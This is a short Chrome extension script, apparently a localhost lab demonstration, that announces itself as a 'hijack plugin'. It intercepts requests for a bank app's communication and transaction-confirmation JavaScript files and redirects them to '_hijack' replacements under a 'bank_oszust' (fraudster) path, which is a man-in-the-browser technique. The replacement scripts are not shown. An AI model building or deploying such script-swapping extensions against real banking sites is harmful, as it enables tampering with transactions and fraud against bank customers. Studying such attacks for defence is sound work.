alert("Hello! hijack plugin is active!!");
chrome.webRequest.onBeforeRequest.addListener(

    function(details) {
        if( details.url == "http://localhost/bank/JS/serverComm.js" ){
        	    //alert("Hello! REDIRECTING TO HIJACK serverComm.js!!");
            return {redirectUrl: "http://localhost/bank_oszust/JS/serverComm_hijack.js" };
            }
        if( details.url == "http://localhost/bank/JS/potwierdz.js" ){
        //alert("Hello! REDIRECTING TO HIJACK potwierdz.js!!");
            return {redirectUrl: "http://localhost/bank_oszust/JS/potwierdz_hijack.js" };
            }
        if( details.url == "http://localhost/bank/JS/potwierdzenie.js" ){
        //alert("Hello! REDIRECTING TO HIJACK potwierdzenie.js!!");
            return {redirectUrl: "http://localhost/bank_oszust/JS/potwierdzenie_hijack.js" };
            }
    },
    {urls: ["http://localhost/bank/*.js"]},["blocking"]);
    
    
    
    


